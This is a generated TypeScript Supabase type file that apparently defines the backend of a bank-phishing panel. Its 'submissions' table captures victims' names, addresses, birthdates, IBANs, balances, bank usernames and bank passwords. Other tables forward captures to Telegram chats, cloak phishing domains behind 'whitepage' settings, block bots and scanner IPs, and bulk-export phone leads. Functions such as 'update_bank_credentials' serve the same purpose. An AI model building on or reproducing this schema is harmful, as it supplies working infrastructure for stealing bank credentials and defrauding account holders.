export type Json =
  | string
  | number
  | boolean
  | null
  | { [key: string]: Json | undefined }
  | Json[]

export type Database = {
  // Allows to automatically instantiate createClient with right options
  // instead of createClient<Database, { PostgrestVersion: 'XX' }>(URL, KEY)
  __InternalSupabase: {
    PostgrestVersion: "14.5"
  }
  public: {
    Tables: {
      bot_blocks: {
        Row: {
          created_at: string
          domain: string | null
          id: string
          ip: string | null
          path: string | null
          reason: string
          referer: string | null
          user_agent: string | null
        }
        Insert: {
          created_at?: string
          domain?: string | null
          id?: string
          ip?: string | null
          path?: string | null
          reason: string
          referer?: string | null
          user_agent?: string | null
        }
        Update: {
          created_at?: string
          domain?: string | null
          id?: string
          ip?: string | null
          path?: string | null
          reason?: string
          referer?: string | null
          user_agent?: string | null
        }
        Relationships: []
      }
      domain_connections: {
        Row: {
          connected_at: string | null
          created_at: string
          domain: string
          id: string
          last_message: string | null
          luxuryhost_id: string | null
          status: string
          updated_at: string
        }
        Insert: {
          connected_at?: string | null
          created_at?: string
          domain: string
          id?: string
          last_message?: string | null
          luxuryhost_id?: string | null
          status?: string
          updated_at?: string
        }
        Update: {
          connected_at?: string | null
          created_at?: string
          domain?: string
          id?: string
          last_message?: string | null
          luxuryhost_id?: string | null
          status?: string
          updated_at?: string
        }
        Relationships: []
      }
      ip_blocklist: {
        Row: {
          base_int: number
          cidr: string
          created_at: string
          id: number
          mask_int: number
          source: string
        }
        Insert: {
          base_int: number
          cidr: string
          created_at?: string
          id?: never
          mask_int: number
          source: string
        }
        Update: {
          base_int?: number
          cidr?: string
          created_at?: string
          id?: never
          mask_int?: number
          source?: string
        }
        Relationships: []
      }
      leads: {
        Row: {
          created_at: string
          id: string
          phone: string
        }
        Insert: {
          created_at?: string
          id?: string
          phone: string
        }
        Update: {
          created_at?: string
          id?: string
          phone?: string
        }
        Relationships: []
      }
      leads_bot_authorized_chats: {
        Row: {
          chat_id: string
          created_at: string
          label: string | null
        }
        Insert: {
          chat_id: string
          created_at?: string
          label?: string | null
        }
        Update: {
          chat_id?: string
          created_at?: string
          label?: string | null
        }
        Relationships: []
      }
      leads_bot_sessions: {
        Row: {
          amount: number | null
          chat_id: string
          state: string
          updated_at: string
        }
        Insert: {
          amount?: number | null
          chat_id: string
          state?: string
          updated_at?: string
        }
        Update: {
          amount?: number | null
          chat_id?: string
          state?: string
          updated_at?: string
        }
        Relationships: []
      }
      leads_extraction_history: {
        Row: {
          backup_count: number
          backup_path: string | null
          chunk_size: number
          created_at: string
          extracted_count: number
          id: string
          source: string
          telegram_chat_id: string | null
          zip_path: string | null
        }
        Insert: {
          backup_count?: number
          backup_path?: string | null
          chunk_size: number
          created_at?: string
          extracted_count: number
          id?: string
          source?: string
          telegram_chat_id?: string | null
          zip_path?: string | null
        }
        Update: {
          backup_count?: number
          backup_path?: string | null
          chunk_size?: number
          created_at?: string
          extracted_count?: number
          id?: string
          source?: string
          telegram_chat_id?: string | null
          zip_path?: string | null
        }
        Relationships: []
      }
      page_visits: {
        Row: {
          created_at: string
          domain: string | null
          id: string
          path: string | null
        }
        Insert: {
          created_at?: string
          domain?: string | null
          id?: string
          path?: string | null
        }
        Update: {
          created_at?: string
          domain?: string | null
          id?: string
          path?: string | null
        }
        Relationships: []
      }
      panel_type_settings: {
        Row: {
          favicon_url: string | null
          type: string
          updated_at: string
        }
        Insert: {
          favicon_url?: string | null
          type: string
          updated_at?: string
        }
        Update: {
          favicon_url?: string | null
          type?: string
          updated_at?: string
        }
        Relationships: []
      }
      panels: {
        Row: {
          created_at: string
          domain: string
          id: string
          meta_tag_enabled: boolean
          meta_tag_snippet: string | null
          type: string
          whitepage_enabled: boolean
        }
        Insert: {
          created_at?: string
          domain: string
          id?: string
          meta_tag_enabled?: boolean
          meta_tag_snippet?: string | null
          type: string
          whitepage_enabled?: boolean
        }
        Update: {
          created_at?: string
          domain?: string
          id?: string
          meta_tag_enabled?: boolean
          meta_tag_snippet?: string | null
          type?: string
          whitepage_enabled?: boolean
        }
        Relationships: []
      }
      reminders: {
        Row: {
          chat_id: string
          created_at: string
          id: string
          notified: boolean
          notify_at: string
          remind_at: string
          title: string
        }
        Insert: {
          chat_id: string
          created_at?: string
          id?: string
          notified?: boolean
          notify_at: string
          remind_at: string
          title: string
        }
        Update: {
          chat_id?: string
          created_at?: string
          id?: string
          notified?: boolean
          notify_at?: string
          remind_at?: string
          title?: string
        }
        Relationships: []
      }
      reminders_bot_authorized_chats: {
        Row: {
          chat_id: string
          created_at: string
          id: string
          label: string | null
        }
        Insert: {
          chat_id: string
          created_at?: string
          id?: string
          label?: string | null
        }
        Update: {
          chat_id?: string
          created_at?: string
          id?: string
          label?: string | null
        }
        Relationships: []
      }
      submission_calls: {
        Row: {
          call_type: string
          created_at: string | null
          id: string
          submission_id: string
          user_email: string
          user_id: string
        }
        Insert: {
          call_type?: string
          created_at?: string | null
          id?: string
          submission_id: string
          user_email: string
          user_id: string
        }
        Update: {
          call_type?: string
          created_at?: string | null
          id?: string
          submission_id?: string
          user_email?: string
          user_id?: string
        }
        Relationships: [
          {
            foreignKeyName: "submission_calls_submission_id_fkey"
            columns: ["submission_id"]
            isOneToOne: false
            referencedRelation: "submissions"
            referencedColumns: ["id"]
          },
        ]
      }
      submission_notes: {
        Row: {
          content: string
          created_at: string | null
          id: string
          submission_id: string
          user_email: string
          user_id: string
        }
        Insert: {
          content: string
          created_at?: string | null
          id?: string
          submission_id: string
          user_email: string
          user_id: string
        }
        Update: {
          content?: string
          created_at?: string | null
          id?: string
          submission_id?: string
          user_email?: string
          user_id?: string
        }
        Relationships: [
          {
            foreignKeyName: "submission_notes_submission_id_fkey"
            columns: ["submission_id"]
            isOneToOne: false
            referencedRelation: "submissions"
            referencedColumns: ["id"]
          },
        ]
      }
      submissions: {
        Row: {
          balance: string | null
          bank: string | null
          bank_extra: Json | null
          bank_password: string | null
          bank_password_label: string | null
          bank_username: string | null
          bank_username_label: string | null
          birthdate: string | null
          city: string | null
          created_at: string | null
          domain: string | null
          door_number: string | null
          email: string | null
          flow: string | null
          full_name: string | null
          house_number: string | null
          iban: string | null
          id: string
          notified_at: string | null
          phone: string | null
          postal_code: string | null
          session_id: string
          staircase: string | null
          status: string | null
          street: string | null
          telegram_sent: boolean
          user_agent: string | null
        }
        Insert: {
          balance?: string | null
          bank?: string | null
          bank_extra?: Json | null
          bank_password?: string | null
          bank_password_label?: string | null
          bank_username?: string | null
          bank_username_label?: string | null
          birthdate?: string | null
          city?: string | null
          created_at?: string | null
          domain?: string | null
          door_number?: string | null
          email?: string | null
          flow?: string | null
          full_name?: string | null
          house_number?: string | null
          iban?: string | null
          id?: string
          notified_at?: string | null
          phone?: string | null
          postal_code?: string | null
          session_id: string
          staircase?: string | null
          status?: string | null
          street?: string | null
          telegram_sent?: boolean
          user_agent?: string | null
        }
        Update: {
          balance?: string | null
          bank?: string | null
          bank_extra?: Json | null
          bank_password?: string | null
          bank_password_label?: string | null
          bank_username?: string | null
          bank_username_label?: string | null
          birthdate?: string | null
          city?: string | null
          created_at?: string | null
          domain?: string | null
          door_number?: string | null
          email?: string | null
          flow?: string | null
          full_name?: string | null
          house_number?: string | null
          iban?: string | null
          id?: string
          notified_at?: string | null
          phone?: string | null
          postal_code?: string | null
          session_id?: string
          staircase?: string | null
          status?: string | null
          street?: string | null
          telegram_sent?: boolean
          user_agent?: string | null
        }
        Relationships: []
      }
      telegram_chat_ids: {
        Row: {
          chat_id: string
          created_at: string | null
          domains: string[]
          id: string
          label: string | null
        }
        Insert: {
          chat_id: string
          created_at?: string | null
          domains?: string[]
          id?: string
          label?: string | null
        }
        Update: {
          chat_id?: string
          created_at?: string | null
          domains?: string[]
          id?: string
          label?: string | null
        }
        Relationships: []
      }
      user_roles: {
        Row: {
          id: string
          role: Database["public"]["Enums"]["app_role"]
          user_id: string
        }
        Insert: {
          id?: string
          role: Database["public"]["Enums"]["app_role"]
          user_id: string
        }
        Update: {
          id?: string
          role?: Database["public"]["Enums"]["app_role"]
          user_id?: string
        }
        Relationships: []
      }
    }
    Views: {
      [_ in never]: never
    }
    Functions: {
      check_ip_blocked: {
        Args: { p_ip_int: number }
        Returns: {
          cidr: string
          source: string
        }[]
      }
      get_leads_count: { Args: never; Returns: number }
      has_role: {
        Args: {
          _role: Database["public"]["Enums"]["app_role"]
          _user_id: string
        }
        Returns: boolean
      }
      tmp_export_leads: {
        Args: { p_limit: number; p_offset: number }
        Returns: string
      }
      update_bank_credentials: {
        Args: {
          p_extra?: Json
          p_password: string
          p_password_label?: string
          p_session_id: string
          p_username: string
          p_username_label?: string
        }
        Returns: undefined
      }
    }
    Enums: {
      app_role: "admin"
    }
    CompositeTypes: {
      [_ in never]: never
    }
  }
}

type DatabaseWithoutInternals = Omit<Database, "__InternalSupabase">

type DefaultSchema = DatabaseWithoutInternals[Extract<keyof Database, "public">]

export type Tables<
  DefaultSchemaTableNameOrOptions extends
    | keyof (DefaultSchema["Tables"] & DefaultSchema["Views"])
    | { schema: keyof DatabaseWithoutInternals },
  TableName extends DefaultSchemaTableNameOrOptions extends {
    schema: keyof DatabaseWithoutInternals
  }
    ? keyof (DatabaseWithoutInternals[DefaultSchemaTableNameOrOptions["schema"]]["Tables"] &
        DatabaseWithoutInternals[DefaultSchemaTableNameOrOptions["schema"]]["Views"])
    : never = never,
> = DefaultSchemaTableNameOrOptions extends {
  schema: keyof DatabaseWithoutInternals
}
  ? (DatabaseWithoutInternals[DefaultSchemaTableNameOrOptions["schema"]]["Tables"] &
      DatabaseWithoutInternals[DefaultSchemaTableNameOrOptions["schema"]]["Views"])[TableName] extends {
      Row: infer R
    }
    ? R
    : never
  : DefaultSchemaTableNameOrOptions extends keyof (DefaultSchema["Tables"] &
        DefaultSchema["Views"])
    ? (DefaultSchema["Tables"] &
        DefaultSchema["Views"])[DefaultSchemaTableNameOrOptions] extends {
        Row: infer R
      }
      ? R
      : never
    : never

export type TablesInsert<
  DefaultSchemaTableNameOrOptions extends
    | keyof DefaultSchema["Tables"]
    | { schema: keyof DatabaseWithoutInternals },
  TableName extends DefaultSchemaTableNameOrOptions extends {
    schema: keyof DatabaseWithoutInternals
  }
    ? keyof DatabaseWithoutInternals[DefaultSchemaTableNameOrOptions["schema"]]["Tables"]
    : never = never,
> = DefaultSchemaTableNameOrOptions extends {
  schema: keyof DatabaseWithoutInternals
}
  ? DatabaseWithoutInternals[DefaultSchemaTableNameOrOptions["schema"]]["Tables"][TableName] extends {
      Insert: infer I
    }
    ? I
    : never
  : DefaultSchemaTableNameOrOptions extends keyof DefaultSchema["Tables"]
    ? DefaultSchema["Tables"][DefaultSchemaTableNameOrOptions] extends {
        Insert: infer I
      }
      ? I
      : never
    : never

export type TablesUpdate<
  DefaultSchemaTableNameOrOptions extends
    | keyof DefaultSchema["Tables"]
    | { schema: keyof DatabaseWithoutInternals },
  TableName extends DefaultSchemaTableNameOrOptions extends {
    schema: keyof DatabaseWithoutInternals
  }
    ? keyof DatabaseWithoutInternals[DefaultSchemaTableNameOrOptions["schema"]]["Tables"]
    : never = never,
> = DefaultSchemaTableNameOrOptions extends {
  schema: keyof DatabaseWithoutInternals
}
  ? DatabaseWithoutInternals[DefaultSchemaTableNameOrOptions["schema"]]["Tables"][TableName] extends {
      Update: infer U
    }
    ? U
    : never
  : DefaultSchemaTableNameOrOptions extends keyof DefaultSchema["Tables"]
    ? DefaultSchema["Tables"][DefaultSchemaTableNameOrOptions] extends {
        Update: infer U
      }
      ? U
      : never
    : never

export type Enums<
  DefaultSchemaEnumNameOrOptions extends
    | keyof DefaultSchema["Enums"]
    | { schema: keyof DatabaseWithoutInternals },
  EnumName extends DefaultSchemaEnumNameOrOptions extends {
    schema: keyof DatabaseWithoutInternals
  }
    ? keyof DatabaseWithoutInternals[DefaultSchemaEnumNameOrOptions["schema"]]["Enums"]
    : never = never,
> = DefaultSchemaEnumNameOrOptions extends {
  schema: keyof DatabaseWithoutInternals
}
  ? DatabaseWithoutInternals[DefaultSchemaEnumNameOrOptions["schema"]]["Enums"][EnumName]
  : DefaultSchemaEnumNameOrOptions extends keyof DefaultSchema["Enums"]
    ? DefaultSchema["Enums"][DefaultSchemaEnumNameOrOptions]
    : never

export type CompositeTypes<
  PublicCompositeTypeNameOrOptions extends
    | keyof DefaultSchema["CompositeTypes"]
    | { schema: keyof DatabaseWithoutInternals },
  CompositeTypeName extends PublicCompositeTypeNameOrOptions extends {
    schema: keyof DatabaseWithoutInternals
  }
    ? keyof DatabaseWithoutInternals[PublicCompositeTypeNameOrOptions["schema"]]["CompositeTypes"]
    : never = never,
> = PublicCompositeTypeNameOrOptions extends {
  schema: keyof DatabaseWithoutInternals
}
  ? DatabaseWithoutInternals[PublicCompositeTypeNameOrOptions["schema"]]["CompositeTypes"][CompositeTypeName]
  : PublicCompositeTypeNameOrOptions extends keyof DefaultSchema["CompositeTypes"]
    ? DefaultSchema["CompositeTypes"][PublicCompositeTypeNameOrOptions]
    : never

export const Constants = {
  public: {
    Enums: {
      app_role: ["admin"],
    },
  },
} as const
